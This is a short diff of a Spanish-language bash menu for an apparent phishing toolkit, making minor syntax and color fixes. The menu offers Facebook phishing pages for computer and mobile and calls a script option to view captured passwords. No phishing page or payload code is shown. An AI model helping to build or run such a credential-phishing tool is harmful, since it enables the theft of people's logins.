@@ -256,13 +256,14 @@ bash install.sh
 clear
 printf "
 $ve LISTO,$am ejecuta el comando$ve said psi$am cada vez que quieras hacer un pishing de alguna página... 
-$re" 
+$re"
+fi
 ;;
 psi|pesi)
 clear
 printf "
 
-$bgr$ro ELIGE EL PHISHING QUE QUIERAS HACER $re
+$bgb$ro ELIGE EL PHISHING QUE QUIERAS HACER $re
 
 $ce[$ve 0$ce ]$am Phishing para facebook en computadora
 $ce[$ve 1$ce ]$am Phishing para Facebook en celular
@@ -314,7 +315,6 @@ a)
 ./phishing.sh --ver -passwords
 ;;
 esac
-fi
 ;;
 
 
